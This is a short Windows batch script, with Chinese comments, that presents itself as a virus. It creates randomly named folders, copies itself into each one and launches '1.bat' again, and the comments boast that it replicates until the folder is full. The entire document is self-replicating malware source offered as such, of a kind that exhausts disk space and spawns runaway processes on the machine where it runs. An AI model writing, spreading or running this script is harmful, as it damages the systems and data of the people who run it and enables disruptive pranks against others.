set a=%random%
set b=%random%
md %a%-%b%
copy %0 %a%-%b%
start 1.bat
::这是一个非常可怕的病毒！
::它会不断自我复制直到填满整个文件夹